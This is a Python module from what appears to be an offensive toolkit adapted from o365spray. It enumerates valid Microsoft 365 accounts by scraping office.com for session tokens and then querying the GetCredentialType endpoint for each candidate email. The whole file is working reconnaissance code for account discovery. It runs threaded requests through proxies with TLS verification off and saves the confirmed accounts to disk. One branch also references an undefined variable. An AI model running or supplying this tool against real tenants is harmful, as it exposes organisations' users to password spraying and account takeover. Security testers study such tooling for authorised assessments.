#!/usr/bin/env python3

import re
import time
import string
import random
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.colors import text_colors
from core.defaults import *

class ASModule(object):

    # Storage for successful results of each task
    successful_results = []

    def __init__(self, *args, **kwargs):
        self.type     = "enum"
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Open file handles for logging and writing test cases
        self.log_file = ThreadWriter(LOG_FILE, kwargs['log_dir'])
        # Build headers and data
        self._pre_office()

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Writing results to: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Write the successful results
        logging.info(f"Valid user accounts: {len(self.successful_results)}")
        with open(f"{self.out_dir}{ENUM_FILE}", 'a') as f:
            write_data(self.successful_results, f)

        # Close the open file handles
        self.log_file.close()

    async def run(self, users, password='password'):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            time.sleep(0.250)

            # --------------------------------------------------------
            # For new modules, modify the below code block logic

            # Via: https://github.com/0xZDH/o365spray/blob/master/core/handlers/enumerator.py#L256
            ''' Enumerate users on Microsoft using Office.com
                https://github.com/gremwell/o365enum/blob/master/o365enum.py '''

            # Build/validate email
            if self.args.domain:
                user = build_email(user, self.args.domain)

            elif not check_email(user):
                logging.error(f"Invalid user: {user}")
                return

            # Grab the office data and set the current user
            data = self.office_data
            data['username'] = user

            url      = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
            response = self._send_request(requests.post,
                                          url,
                                          json=data,
                                          headers=self.office_headers)

            r_status = response.status_code
            r_body   = response.json()

            if r_status == 200:
                # It appears that both 0 and 6 response codes indicate a valid user - whereas 5 indicates
                # the use of a different identity provider -- let's account for that
                # https://www.redsiege.com/blog/2020/03/user-enumeration-part-2-microsoft-office-365/
                # https://warroom.rsmus.com/enumerating-emails-via-office-com/
                if int(r_body['IfExistsResult']) in [0, 6]:
                    self.successful_results.append(user)
                    logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}")

                elif int(body['IfExistsResult']) == 5:
                    self.successful_results.append(user)
                    logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}")
                    logging.debug(f"{user}: Different Identity Provider")

                else:
                    print(f"{text_colors.red}[ - ]{text_colors.reset} {user}{gen_space(user)}", end='\r')

            else:
                print(f"{text_colors.red}[ - ]{text_colors.reset} {user}{gen_space(user)}", end='\r')

            # End template module code block logic.
            # --------------------------------------------------------

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None, json=None,
                      headers=HTTP_HEADERS, allow_redirects=False):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=allow_redirects,
                       verify=False)

    # Via: https://github.com/0xZDH/o365spray/blob/master/core/handlers/enumerator.py#L202
    ''' Pre-handling of Office.com enumeration
        https://github.com/gremwell/o365enum/blob/master/o365enum.py
        Note: Collect and build the correct header and parameter data to perform user enumeration
              against office.com
        This method only needs to be run once at initialization of this module class '''
    def _pre_office(self):
        # Request the base domain to collect the `client_id`
        response = self._send_request(requests.get,
                                     "https://www.office.com",
                                      allow_redirects=True)

        client_id = re.findall(b'"appId":"([^"]*)"', response.content)

        # Request the /login page and follow redirects to collect the following params:
        #   `hpgid`, `hpgact`, `hpgrequestid`
        response = self._send_request(requests.get,
                                      "https://www.office.com/login?es=Click&ru=/&msafed=0",
                                      allow_redirects=True)

        hpgid  = re.findall(b'hpgid":([0-9]+),',  response.content)
        hpgact = re.findall(b'hpgact":([0-9]+),', response.content)
        hpgrequestid = response.headers['x-ms-request-id']

        self.office_headers = HTTP_HEADERS

        # Update headers
        self.office_headers['Referer']           = response.url
        self.office_headers['hpgrequestid']      = hpgrequestid
        self.office_headers['client-request-id'] = client_id[0]
        self.office_headers['hpgid']             = hpgid[0]
        self.office_headers['hpgact']            = hpgact[0]
        self.office_headers['Accept']            = "application/json"
        self.office_headers['Origin']            = "https://login.microsoftonline.com"

        # Build random canary token
        self.office_headers['canary'] = ''.join(
            random.choice(
                string.ascii_uppercase + string.ascii_lowercase + string.digits + "-_"
            ) for i in range(248)
        )

        # Build the Office request data
        self.office_data = {
            "originalRequest":                 re.findall(b'"sCtx":"([^"]*)"', response.content)[0].decode('utf-8'),
            "isOtherIdpSupported":             True,
            "isRemoteNGCSupported":            True,
            "isAccessPassSupported":           True,
            "checkPhones":                     False,
            "isCookieBannerShown":             False,
            "isFidoSupported":                 False,
            "forceotclogin":                   False,
            "isExternalFederationDisallowed":  False,
            "isRemoteConnectSupported":        False,
            "isSignup":                        False,
            "federationFlags":                 0
        }
